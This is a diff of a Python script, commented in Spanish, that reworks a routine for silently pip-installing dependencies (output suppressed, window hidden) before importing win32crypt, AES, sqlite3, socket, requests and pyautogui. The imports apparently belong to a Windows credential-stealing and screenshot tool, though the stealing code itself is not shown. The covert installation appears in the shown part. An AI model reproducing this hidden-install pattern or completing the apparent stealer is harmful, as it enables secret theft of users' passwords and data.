@@ -2,29 +2,50 @@ import subprocess
 import sys
 import importlib
 
-def asegurar_paquete(modulo, paquete):
-    try:
-        return importlib.import_module(modulo)
-    except ImportError:
+def instalar_y_probar():
+    paquetes = {
+        "Crypto": "pycryptodome",
+        "requests": "requests",
+        "PIL": "pillow",
+        "pyautogui": "pyautogui",
+        "win32crypt": "pywin32"
+    }
+    
+    for modulo, paquete in paquetes.items():
         try:
-            subprocess.run(
-                ["py", "-m", "pip", "install", paquete],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            return importlib.import_module(modulo)
-        except Exception:
-            return None
+            importlib.import_module(modulo)
+        except ImportError:
+            try:
+                subprocess.run(
+                    ["py", "-m", "pip", "install", paquete],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            except Exception:
+                pass
 
-# Asegurar e importar cada dependencia de forma segura antes de usarlas
-AES = asegurar_paquete("Crypto.Cipher", "pycryptodome") # o importar el submódulo necesario
-# Si prefieres asegurarlos todos al inicio sin que den error de sintaxis global:
-asegurar_paquete("Crypto", "pycryptodome")
-asegurar_paquete("requests", "requests")
-asegurar_paquete("PIL", "pillow")
-asegurar_paquete("pyautogui", "pyautogui")
-asegurar_paquete("win32crypt", "pywin32")
+# 1. Instalar dependencias primero
+instalar_y_probar()
+
+# 2. Cargar los módulos de forma segura dentro de variables locales o un espacio de trabajo
+AES = importlib.import_module("Crypto.Cipher.AES") # O la forma en que uses AES
+base64 = importlib.import_module("base64")
+io = importlib.import_module("io")
+json = importlib.import_module("json")
+os = importlib.import_module("os")
+platform = importlib.import_module("platform")
+shutil = importlib.import_module("shutil")
+socket = importlib.import_module("socket")
+sqlite3 = importlib.import_module("sqlite3")
+subprocess_mod = importlib.import_module("subprocess")
+sys_mod = importlib.import_module("sys")
+tempfile = importlib.import_module("tempfile")
+time = importlib.import_module("time")
+win32crypt = importlib.import_module("win32crypt")
+pyautogui = importlib.import_module("pyautogui")
+Image = importlib.import_module("PIL.Image")
+requests = importlib.import_module("requests")
 
 # Ahora sí, tus imports normales ya funcionarán porque ya están instalados:
 from Crypto.Cipher import AES
